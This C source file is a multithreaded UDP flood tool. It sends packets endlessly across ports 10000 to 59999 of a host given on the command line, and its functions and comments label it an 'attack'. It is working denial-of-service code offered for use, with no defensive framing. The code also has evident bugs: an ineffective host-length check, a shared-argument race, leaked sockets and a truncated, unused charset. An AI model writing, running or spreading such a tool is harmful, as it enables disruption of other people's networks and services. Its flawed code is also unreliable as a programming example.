#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>

#define DIE(x) { perror(x); exit (EXIT_FAILURE); }
#define SUCCESS(x) { printf(x); exit (EXIT_SUCCESS); }

int	threads = 0;
pthread_mutex_t	lock = PTHREAD_MUTEX_INITIALIZER;

struct attack_args {
    char host[16];
    unsigned short port;
};

static char *rand_string(char *str, size_t size) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJK...";
    if (size) {
        --size;
        for (size_t n = 0; n < size; n++) {
            int key = rand() % (int) (sizeof charset - 1);
            str[n] = charset[key];
        }
        str[size] = '\0';
    }
    return str;
}

void udp_port_attack(char *host, unsigned short port){
    int sck;
 
    sck = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
   
    struct sockaddr_in serv;
    size_t slen = sizeof(serv);
 
    serv.sin_family = AF_INET;
    if(inet_aton(host, &serv.sin_addr)==0) {
        printf("fail");
        exit(-1);
    }

    /* TODO: change line below to random data */
    char l[2] = {'A','\0'};
    serv.sin_port = htons(port);
    sendto(sck, &l, 2, 0, (struct sockaddr *) &serv, slen);
}

void *thread_task(void *threadargs) {
    struct attack_args *args;

    args = threadargs;

    /*sets up threads for speediness */
    pthread_mutex_lock(&lock);
    threads++;
    pthread_mutex_unlock(&lock);
    pthread_detach(pthread_self());
   
    /* attack starts here */
    udp_port_attack(args->host, args->port); 
    printf("port: %d\n", args->port);

    /*once process finishes it removes the thread*/
    pthread_mutex_lock(&lock);
    threads--;
    pthread_mutex_unlock(&lock);

    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    int i;
    pthread_t thread;
    struct attack_args args;
   
    if (sizeof(argv[1]) > 16)
        SUCCESS("Host input invalid");
    sprintf(args.host, "%s", argv[1]);
    while(1) {
        for(i=10000;i<60000;i++) {
            args.port = i; 
            /* simple spinlock to keep thread file usage down */
            while (threads >= 200);  
            pthread_create(&thread, NULL, thread_task, &args);
        }
    }
}
